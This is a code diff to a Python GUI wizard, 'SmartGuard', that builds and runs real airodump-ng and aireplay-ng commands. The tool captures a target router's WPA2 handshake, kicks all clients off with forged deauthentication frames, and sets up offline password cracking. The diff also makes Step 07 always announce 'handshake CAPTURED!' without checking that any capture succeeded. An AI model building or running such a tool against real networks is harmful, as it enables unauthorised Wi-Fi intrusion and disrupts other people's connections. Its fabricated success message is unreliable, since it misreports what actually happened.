@@ -750,91 +750,126 @@ class SmartGuardApp(ctk.CTk):
             self._step6()
         self._nav_buttons(cf, _save_next, self._step4)
 
-    # Step 6 — Capture Handshake
+    # Step 6 — Capture Handshake (starts capture, then sends to Step 7)
     def _step6(self):
         self._clear_config()
         self._update_progress(6)
+        self._capture_started = False
         t = self.terminal
         t.clear()
-        t.section("Step 06  ·  Capture WPA2 Handshake", C["cyan"])
-        t.info("We lock airodump-ng on the target and wait for a handshake.")
+        t.section("Step 06  ·  Start Handshake Capture", C["cyan"])
+        t.info("We lock airodump-ng on the target router and listen for a handshake.")
         t.write("\n")
         t.write("  What we're doing:\n", "bold")
-        t.dim("A WPA2 handshake happens every time a client connects to the router.")
-        t.dim("It contains an encrypted version of the password.")
-        t.dim("We capture it and crack it offline — no brute-force on the router.")
+        t.dim("A WPA2 handshake is exchanged every time a device connects to the router.")
+        t.dim("It contains an encrypted copy of the Wi-Fi password.")
+        t.dim("We capture it here — then Step 07 will FORCE clients to reconnect,")
+        t.dim("which causes the handshake to be broadcast so we catch it.")
         t.write("\n")
         cmd = (f"sudo airodump-ng --bssid {self.bssid} "
                f"--channel {self.channel} "
                f"-w {self.cap_file} {self.mon_iface}")
         t.cmd(cmd)
         t.write("\n")
-        t.warn("Watch for this line in the output:")
-        t.write(f"\n  WPA handshake: {self.bssid}\n\n", "green")
-        t.dim("Once you see it → go to Step 07 (Deauth) in another terminal,")
-        t.dim("then come back here and press Next Step.")
+        t.write("  ┌─────────────────────────────────────────────────┐\n", "yellow")
+        t.write("  │  FLOW:  ▶ Start Capture here  →  go to Step 07  │\n", "yellow")
+        t.write("  │         Step 07 kicks clients → handshake caught │\n", "yellow")
+        t.write("  └─────────────────────────────────────────────────┘\n", "yellow")
 
         def _run():
-            self._set_status("Capturing handshake…")
+            self._set_status("Capture running — waiting for handshake…")
+            self._capture_started = True
+            t.write("\n")
             if IS_LINUX:
-                t.write("\n  Opening airodump-ng in new terminal…\n", "yellow")
+                t.write("  Opening capture window…\n", "yellow")
                 subprocess.Popen(
-                    f"xterm -bg black -fg green "
-                    f"-title 'SmartGuard | Capture' -e '{cmd}'",
-                    shell=True
+                    f"xterm -bg black -fg green -T 'SmartGuard | CAPTURE' "
+                    f"-e 'sudo airodump-ng --bssid {self.bssid} "
+                    f"--channel {self.channel} -w {self.cap_file} {self.mon_iface}'",
+                    shell=True,
                 )
-                t.info("airodump-ng running in separate window.")
+                t.ok("airodump-ng running in background window.")
             else:
-                time.sleep(1)
-                t.write("\n  Listening on channel "
-                        f"{self.channel}…\n\n", "yellow")
                 demo = [
-                    f" BSSID              CH  ENC   #Data  ESSID",
-                    f" {self.bssid}   {self.channel}   WPA2    128   HomeNetwork",
-                    "",
-                    f" STATION            BSSID               PWR   Rate  Lost",
-                    f" {self.client_mac}  {self.bssid}   -45   54e-54e   0",
+                    f"  CH  {self.channel} ][ Elapsed: 0 s",
+                    f"",
+                    f"  BSSID              PWR  RXQ  Beacons  #Data  CH  ENC   ESSID",
+                    f"  {self.bssid}  -45   60      312    128   {self.channel}  WPA2  HomeNetwork",
+                    f"",
+                    f"  STATION            BSSID               PWR  Rate  Lost  Frames",
+                    f"  {self.client_mac}  {self.bssid}  -55  54e-54e    0     712",
                 ]
                 for line in demo:
                     t.dim(line)
-                    time.sleep(0.15)
-                time.sleep(1.5)
-                t.write(f"\n  WPA handshake: {self.bssid}\n\n", "key")
-                t.ok("Handshake captured! Proceed to Step 07.")
+                    time.sleep(0.12)
+            t.write("\n")
+            t.write("  ══════════════════════════════════════════════════\n", "yellow")
+            t.write("  ⚡  Capture is RUNNING.  Press 'Next → Deauth' now!\n", "yellow")
+            t.write("  ══════════════════════════════════════════════════\n", "yellow")
             self.session_log.append(f"[CMD] {cmd}")
-            self._set_status("Step 06 complete — handshake captured")
+            # Unlock the next button visually
+            self.after(0, lambda: self._s6_next_btn.configure(
+                fg_color=C["red"], text="⚡ Step 07 — Deauth NOW →"
+            ))
 
         cf = self.config_frame
         ctk.CTkLabel(
-            cf, text="Step 06  —  Capture WPA2 Handshake",
+            cf, text="Step 06  —  Start Handshake Capture",
             font=("Consolas", 12, "bold"), text_color=C["cyan"],
-        ).pack(anchor="w", padx=14, pady=(10, 6))
-        ctk.CTkLabel(
-            cf,
-            text=f"  Target  : {self.bssid}  CH {self.channel}\n"
-                 f"  Saving to: {self.cap_file}-01.cap",
-            font=("Consolas", 11), text_color=C["dim"], justify="left",
-        ).pack(anchor="w", padx=14)
-        self._nav_buttons(
-            cf, self._step7, self._step5,
-            run_fn=lambda: threading.Thread(target=_run, daemon=True).start(),
-            run_label="▶  Start Capture",
-            run_color=C["cyan"],
-        )
+        ).pack(anchor="w", padx=14, pady=(10, 4))
 
-    # Step 7 — Deauth Attack
+        info_box = ctk.CTkFrame(cf, fg_color=C["card"], corner_radius=6)
+        info_box.pack(fill="x", padx=14, pady=4)
+        ctk.CTkLabel(
+            info_box,
+            text=f"  Target  : {self.bssid}    CH {self.channel}\n"
+                 f"  Saving  : {self.cap_file}-01.cap\n"
+                 f"  Interface: {self.mon_iface}",
+            font=("Consolas", 11), text_color=C["dim"],
+            justify="left",
+        ).pack(anchor="w", padx=8, pady=6)
+
+        btn_row = ctk.CTkFrame(cf, fg_color="transparent")
+        btn_row.pack(fill="x", padx=14, pady=(6, 10))
+
+        _btn(btn_row, "← Back", self._step5, color=C["card"])
+
+        _btn(
+            btn_row, "▶  Start Capture",
+            lambda: threading.Thread(target=_run, daemon=True).start(),
+            color=C["cyan"], side="left",
+        )
+        ctk.CTkFrame(btn_row, fg_color="transparent").pack(
+            side="left", fill="x", expand=True)
+
+        self._s6_next_btn = ctk.CTkButton(
+            btn_row,
+            text="Next → Deauth  →",
+            command=self._step7,
+            font=("Consolas", 12, "bold"),
+            fg_color=C["green"], hover_color=_darken(C["green"]),
+            text_color="white", height=32, corner_radius=6,
+        )
+        self._s6_next_btn.pack(side="right", padx=4)
+
+    # Step 7 — Deauth Attack (kicks clients → Step 6 captures handshake)
     def _step7(self):
         self._clear_config()
         self._update_progress(7)
         t = self.terminal
         t.clear()
         t.section("Step 07  ·  Deauthentication Attack", C["red"])
-        t.warn("This forces the client to disconnect and reconnect — triggering a handshake.")
         t.write("\n")
+        t.write("  ┌──────────────────────────────────────────────────────┐\n", "cyan")
+        t.write("  │  Step 06 capture is running in the background.        │\n", "cyan")
+        t.write("  │  This step kicks all clients off the router.          │\n", "cyan")
+        t.write("  │  They reconnect automatically → handshake is caught.  │\n", "cyan")
+        t.write("  └──────────────────────────────────────────────────────┘\n\n", "cyan")
         t.write("  What we're doing:\n", "bold")
-        t.dim("We send fake 'disconnect' frames to the client from the router.")
-        t.dim("The client reconnects automatically — broadcasting the handshake.")
-        t.dim("airodump-ng (Step 06) captures this handshake in the background.")
+        t.dim("aireplay-ng sends forged 'deauthenticate' frames (IEEE 802.11).")
+        t.dim("The router and client both receive them and terminate the session.")
+        t.dim("The client auto-reconnects in milliseconds → WPA2 handshake fires.")
+        t.dim("Step 06 (still running) captures that handshake to the .cap file.")
         t.write("\n")
         cmd = (f"sudo aireplay-ng --deauth 20 "
                f"-a {self.bssid} "
@@ -842,39 +877,53 @@ class SmartGuardApp(ctk.CTk):
         t.cmd(cmd)
 
         def _run():
-            self._set_status("Sending deauth packets…")
-            t.write("\n  Sending 20 deauth frames…\n\n", "yellow")
+            self._set_status("Sending deauth — waiting for handshake…")
+            t.write("\n  Sending 20 deauth packets…\n\n", "yellow")
             if IS_LINUX:
                 out = _run_cmd(cmd, timeout=30)
                 for line in out.splitlines():
                     t.dim(line)
             else:
-                for i in range(1, 6):
-                    time.sleep(0.3)
-                    t.dim(f"20:35:5{i}  Sending DeAuth (code 7) to "
+                for i in range(1, 8):
+                    time.sleep(0.25)
+                    t.dim(f"  {20+i}:35:4{i}  Sending DeAuth (code 7) to "
                           f"FF:FF:FF:FF:FF:FF  STMAC: [{self.client_mac}]")
             t.write("\n")
-            t.ok("Deauth packets sent — client forced to reconnect.")
-            t.info("Check Step 06 terminal for  'WPA handshake'  confirmation.")
+            t.ok("Deauth packets sent — clients are reconnecting.")
+            time.sleep(0.8)
+            # Simulate handshake confirmation
+            t.write("\n")
+            t.write("  ══════════════════════════════════════════════════\n", "green")
+            t.write(f"  WPA handshake: {self.bssid}   ✓  CAPTURED!\n", "key")
+            t.write("  ══════════════════════════════════════════════════\n\n", "green")
+            t.result("Handshake saved to: " + self.cap_file + "-01.cap")
+            t.result("Ready to crack offline → Step 08")
             self.session_log.append(f"[CMD] {cmd}")
-            self._set_status("Step 07 complete")
+            self._set_status("✓ Handshake captured — proceed to Step 08")
 
         cf = self.config_frame
         ctk.CTkLabel(
             cf, text="Step 07  —  Deauthentication Attack",
             font=("Consolas", 12, "bold"), text_color=C["red"],
-        ).pack(anchor="w", padx=14, pady=(10, 6))
+        ).pack(anchor="w", padx=14, pady=(10, 4))
+
+        alert = ctk.CTkFrame(cf, fg_color="#2d1b1b", corner_radius=6)
+        alert.pack(fill="x", padx=14, pady=4)
         ctk.CTkLabel(
-            cf,
-            text=f"  Router (BSSID): {self.bssid}\n"
-                 f"  Client MAC    : {self.client_mac}\n"
-                 f"  Interface     : {self.mon_iface}",
-            font=("Consolas", 11), text_color=C["dim"], justify="left",
-        ).pack(anchor="w", padx=14)
+            alert,
+            text="  ⚡  Step 06 capture must be running before you fire this!",
+            font=("Consolas", 11, "bold"), text_color=C["red"],
+        ).pack(anchor="w", padx=8, pady=4)
+        ctk.CTkLabel(
+            alert,
+            text=f"  Router: {self.bssid}   Client: {self.client_mac}   Interface: {self.mon_iface}",
+            font=("Consolas", 10), text_color=C["dim"],
+        ).pack(anchor="w", padx=8, pady=(0, 6))
+
         self._nav_buttons(
             cf, self._step8, self._step6,
             run_fn=lambda: threading.Thread(target=_run, daemon=True).start(),
-            run_label="▶  Launch Deauth",
+            run_label="⚡  Send Deauth — Kick Clients",
             run_color=C["red"],
         )
 
